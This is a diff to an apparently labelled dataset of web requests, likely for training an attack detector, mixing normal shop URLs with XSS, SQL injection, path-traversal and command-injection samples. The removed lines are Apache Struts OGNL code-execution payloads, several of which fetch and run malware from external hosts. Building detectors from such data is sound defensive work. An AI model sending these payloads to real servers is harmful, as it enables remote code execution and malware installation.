@@ -89,7 +89,6 @@ publico/vaciar.jsp?B2=Vaciar+carrito,normal
 global/estilos.css,normal
 ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../{FILE},traversal
 global/titulo.jsp,normal
-%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action,code_injection
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 &1c: select * from users where id=1   or 1=1 -- 1,sqli
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,traversal
@@ -478,7 +477,6 @@ publico/autenticar.jsp?modo=entrar&login=mame&pwd=alAR1aDo0&remember=off&B1=Entr
 publico/miembros.jsp,normal
 "<img SRC=""javascript:document.vulnerable=true;"">",xss
 global/estilos.css,normal
-"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]=""cmd"",%23ssss[1]=""%2fC"",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt",code_injection
 miembros/index.jsp,normal
 publico/productos.jsp,normal
 miembros/imagenes/ogono.jpg,normal
@@ -708,7 +706,6 @@ publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 miembros/imagenes/ogono.jpg,normal
 global/titulo.jsp,normal
 imagenes/logo.gif,normal
-"debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()",code_injection
 global/menum.jsp,normal
 &#60;IMG SRC&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#62;,xss
 %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
@@ -1372,7 +1369,6 @@ index.jsp,normal
 publico/carrito.jsp,normal
 ..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
 "&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
-"${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}",code_injection
 "<img src=""javascript:document.vulnerable=true;"">",xss
 "<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
 a);/usr/bin/id|,command_injection
@@ -1998,7 +1994,6 @@ global/estilos.css,normal
 "<BR SIZE=""&{alert('XSS')}"">",xss
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 "<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..",code_injection
 miembros/fotos.jsp,normal
 imagenes/3.gif,normal
 global/titulo.jsp,normal
@@ -2409,7 +2404,6 @@ miembros/imagenes/zarauz.jpg,normal
 imagenes/3.gif,normal
 publico/caracteristicas.jsp?id=2,normal
 publico/autenticar.jsp?modo=entrar&login=sait&pwd=t20s3da43%F36&remember=on&B1=Entrar,normal
-"a=1${(%23_memberAccess[""allowStaticMethodAccess""]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.println(%23req.getRealPath(""/"")),%23k8out.close())}",code_injection
 &#60;IMG SRC&#61;&#34;jav ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
 "<IMG SRC=""javascript:alert('XSS')""",xss
 "<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
@@ -2554,7 +2548,6 @@ miembros/imagenes/zarauz.jpg,normal
 index.jsp,normal
 publico/miembros.jsp,normal
 "<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",xss
-"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd /c del C:/Windows/temp/appveif.vbs&echo Set Post = CreateObject(""Msxml2.XMLHTTP"") >>C:/Windows/temp/appveif.vbs&echo Set Shell = CreateObject(""Wscript.Shell"") >>C:/Windows/temp/appveif.vbs&echo Post.Open ""GET"",""http://a46.bulehero.in/download.exe"",0 >>C:/Windows/temp/appveif.vbs&echo Post.Send() >>C:/Windows/temp/appveif.vbs&echo Set aGet = CreateObject(""ADODB.Stream"") >>C:/Windows/temp/appveif.vbs&echo aGet.Mode = 3 >>C:/Windows/temp/appveif.vbs&echo aGet.Type = 1 >>C:/Windows/temp/appveif.vbs&echo aGet.Open() >>C:/Windows/temp/appveif.vbs&echo aGet.Write(Post.responseBody) >>C:/Windows/temp/appveif.vbs&echo aGet.SaveToFile ""C:/Windows/temp/appveif.exe"",2 >>C:/Windows/temp/appveif.vbs&echo wscript.sleep 10000>>C:/Windows/temp/appveif.vbs&echo Shell.Run (""C:/Windows/temp/appveif.exe"")>>C:/Windows/temp/appveif.vbs&C:/Windows/temp/appveif.vbs').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 "<IMG SRC=x onended=""alert(String.fromCharCode(88,83,83))"">",xss
 "<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
 imagenes/nuestratierra.jpg,normal
@@ -2640,7 +2633,6 @@ imagenes/3.gif,normal
 "<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
 publico/caracteristicas.jsp?id=1,normal
 global/creditos.jsp,normal
-"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]=""%2fbin%2fsh"",%23ssss[1]=""%2dc"",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt",code_injection
 index.jsp,normal
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',xss
 publico/miembros.jsp,normal
@@ -2862,7 +2854,6 @@ imagenes/nuestratierra.jpg,normal
 "</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
 ..\..\..\..\..\..\..\..\{FILE},traversal
 <~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
-"PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL",code_injection
 miembros/index.jsp,normal
 8888'+AND+'1'+LIKE+'1 -->,sqli
 miembros/editar.jsp?modo=registro&login=chukwuem0&password=1R0MEntIcI2&nombre=Yesenia&apellidos=Mont+Olascoaga&email=laffan%40phd-photodecor.bv&dni=84304826M&direccion=Carlos+Tomas+Romero+130+&ciudad=Muras&cp=15911&provincia=Valladolid&ntc=4890165807728190&B1=Registrar,normal
@@ -2907,7 +2898,6 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 "<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 publico/productos.jsp,normal
 publico/caracteristicas.jsp?id=2,normal
-debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1,code_injection
 "<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
 distinct,sqli
 "&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1",sqli
@@ -3208,7 +3198,6 @@ global/estilos.css,normal
 "<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 "<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",xss
 a;/usr/bin/id,command_injection
-"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo klss').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 <input value=<><iframe/src=javascript:confirm(1),xss
 publico/productos.jsp,normal
 miembros/imagenes/zarauz.jpg,normal
@@ -3252,7 +3241,6 @@ miembros/editar.jsp?modo=registro&login=karchevs&password=cresta-da&nombre=Giuli
 "<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
 global/menum.jsp,normal
 "s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'",sqli
-"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-rSAh')).(#f=@java.io.File@createTempFile('SMLp','.exe')).(#f.setExecutable(true)).(#f.deleteOnExit()).(#fos=new java.io.FileOutputStream(#f)).(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data)).(#fos.write(#d)).(#fos.close()).(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).(#p.start()).(#f.delete())}",code_injection
 publico/registro.jsp?modo=registro&login=nelia3&password=embel1e542&nombre=H%E9rcules&apellidos=Diez+Lizano&email=prueckner%40helicopter.com.gf&dni=33095587J&direccion=C%2F+Afrodita+160%2C+5%3FB&ciudad=Vistabella&cp=06894&provincia=Huelva&ntc=0367766571989021&B1=Registrar,normal
 "<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
@@ -3324,7 +3312,6 @@ imagenes/3.gif,normal
 index.jsp,normal
 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),sqli
 index.jsp,normal
-"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://65.254.63.20/.jb | perl ; cd /tmp ; curl -O http://65.254.63.20/.jb ; fetch http://65.254.63.20/.jb ; perl .jb ;rm -rf .jb*').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 ..%u2216..%u2216..%u2216{FILE},traversal
 publico/productos.jsp,normal
 "ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
@@ -3496,7 +3483,6 @@ miembros/imagenes/zarauz.jpg,normal
 %c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 miembros/editar.jsp?modo=registro&login=castrono&password=deSpArPajo&nombre=Lucian&apellidos=Urbon&email=fredman6%40cor-jet.to&dni=34295530T&direccion=Plaza+San+Miguel+132%2C+&ciudad=Pera%2C+La&cp=23690&provincia=Cuenca&ntc=0142716118287558&B1=Registrar,normal
-"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd /c del C:/Windows/temp/appveif.vbs&echo Set Post = CreateObject(""Msxml2.XMLHTTP"") >>C:/Windows/temp/appveif.vbs&echo Set Shell = CreateObject(""Wscript.Shell"") >>C:/Windows/temp/appveif.vbs&echo Post.Open ""GET"","""",0 >>C:/Windows/temp/appveif.vbs&echo Post.Send() >>C:/Windows/temp/appveif.vbs&echo Set aGet = CreateObject(""ADODB.Stream"") >>C:/Windows/temp/appveif.vbs&echo aGet.Mode = 3 >>C:/Windows/temp/appveif.vbs&echo aGet.Type = 1 >>C:/Windows/temp/appveif.vbs&echo aGet.Open() >>C:/Windows/temp/appveif.vbs&echo aGet.Write(Post.responseBody) >>C:/Windows/temp/appveif.vbs&echo aGet.SaveToFile ""C:/Windows/temp/appveif.exe"",2 >>C:/Windows/temp/appveif.vbs&echo wscript.sleep 10000>>C:/Windows/temp/appveif.vbs&echo Shell.Run (""C:/Windows/temp/appveif.exe"")>>C:/Windows/temp/appveif.vbs&C:/Windows/temp/appveif.vbs').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 "<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",xss
 "<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 "&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",xss
@@ -4201,7 +4187,6 @@ miembros/fotos.jsp,normal
 <IMG SRC=javascript:javascript:alert(1)>,xss
 """<META HTTP-EQUIV=""""Link"""" Content=""""<http://ha.ckers.org/xss.css>; REL=stylesheet"""">""",xss
 "<table background=""javascript:javascript:alert(1)"">",xss
-"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cd /tmp;wget tractor.bphack.ru/error2;perl error2;rm -rf error2').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 miembros/editar.jsp?modo=registro&login=ichizen&password=Ca%D1iLLa&nombre=Rafaela&apellidos=Lemunao+Porxas&email=callaway.nererova%40mirallesmoscardo.ca&dni=55658066K&direccion=C%2F+Madre+Castisima%2C+S%2FN+&ciudad=Lupiana&cp=09267&provincia=Alicante&ntc=6588349336548778&B1=Registrar,normal
 "<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
 miembros/fotos.jsp,normal
@@ -5074,7 +5059,6 @@ publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=7&B1=A%F1adir+a
 imagenes/cmenbul.gif,normal
 publico/miembros.jsp,normal
 imagenes/2.gif,normal
-"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hxvjptv200','hxvjptv200')}.multipart/form-data",code_injection
 miembros/fotos.jsp,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 "<img LOWSRC=""javascript:document.vulnerable=true;"">",xss
@@ -5245,7 +5229,6 @@ imagenes/2.gif,normal
 publico/autenticar.jsp?modo=entrar&login=cetraro&pwd=eSqUILero&remember=off&B1=Entrar,normal
 &#X000003c,xss
 "s,.s: select * from users where id=1 or "",."" or 1=1 -- 1",sqli
-('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))')(d))&(i99)(('\43xman.getWriter().close()')(d)),code_injection
 publico/productos.jsp,normal
 <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
 "<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
@@ -5431,7 +5414,6 @@ sleep(9999),sqli
 imagenes/cmenbul.gif,normal
 imagenes/cmenbul.gif,normal
 "<IMG DYNSRC=""javascript:alert('XSS')"">",xss
-1%0d%0a1${(#x0='multipart/form-data').(#a1=14293212).(#a2=3009821).(#a3=#a1+#a2).(#a4='ttpServletResponse').(#a6='com.opensymph').(#a5='ony.xwork2.dispatcher.H').(#a7=#a6+#a5+#a4).(#a8='1n').(#a9='_ks3').(#a10=#a9+#a8).(#x1=#context[#a7].getWriter()).(#x1.print(#a3+#a10)).(#x1.close())},code_injection
 ..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,traversal
 global/estilos.css,normal
@@ -7173,7 +7155,6 @@ imagenes/2.gif,normal
 ..%255c..%255c..%255c{FILE},traversal
 "&#60;IMG SRC&#61;javascript&#58;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#62;",xss
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
-"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}",code_injection
 global/creditos.jsp,normal
 "<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",xss
 miembros/salir.jsp,normal
@@ -7440,7 +7421,6 @@ miembros/imagenes/ogono.jpg,normal
 publico/registro.jsp?modo=registro&login=benjavan&password=MaNtateri.lla&nombre=Barcario&apellidos=Estades+Orizales&email=shaughnessy%40white-pearl-resort.nf&dni=53933880F&direccion=o+Rio%2C+134%2C+&ciudad=Elorrio&cp=02247&provincia=Navarra&ntc=1022652655889356&B1=Registrar,normal
 publico/autenticar.jsp?modo=entrar&login=pittman&pwd=a73p3i4&remember=off&B1=Entrar,normal
 miembros/imagenes/ogono.jpg,normal
-"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vaxoruc','vaxoruc')}.multipart/form-data",code_injection
 publico/pagar.jsp?modo=insertar&precio=6796&B1=Pasar+por+caja,normal
 imagenes/3.gif,normal
 global/creditos.jsp,normal
@@ -7675,7 +7655,6 @@ miembros/fotos.jsp,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 publico/registro.jsp?modo=registro&login=mattes&password=agalladura&nombre=Anan%EDas&apellidos=Romeralo+Per%EDs&email=swenson%40pasajesaereosbaratos.do&dni=59760678P&direccion=Andador+Carlos+Lapetra+191%2C+5C&ciudad=Sant+Pere+de+Ribes&cp=33300&provincia=%C1vila&ntc=6803792379658242&B1=Registrar,normal
 publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=16&B1=A%F1adir+al+carrito,normal
-"${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}",code_injection
 global/menum.jsp,normal
 miembros/imagenes/zarauz.jpg,normal
 publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=28&B1=A%F1adir+al+carrito,normal
@@ -8021,7 +8000,6 @@ global/menum.jsp,normal
 publico/pagar.jsp?modo=insertar&precio=8996&B1=Confirmar,normal
 imagenes/nuestratierra.jpg,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
-"%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1",code_injection
 ..../..../..../..../..../{FILE},traversal
 "<BASE HREF=""javascript:alert('XSS');//"">",xss
 publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=18&B1=A%F1adir+al+carrito,normal
@@ -8047,7 +8025,6 @@ global/titulo.jsp,normal
 publico/productos.jsp,normal
 miembros/editar.jsp?modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar,normal
 .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE},traversal
-"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rwjwnbv','rwjwnbv')}.multipart/form-data ",code_injection
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
 miembros/imagenes/castro.jpg,normal
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
@@ -9055,7 +9032,6 @@ imagenes/2.gif,normal
 "ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
 miembros/imagenes/castro.jpg,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
-"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 "&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",xss
 "ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
 imagenes/logo.gif,normal
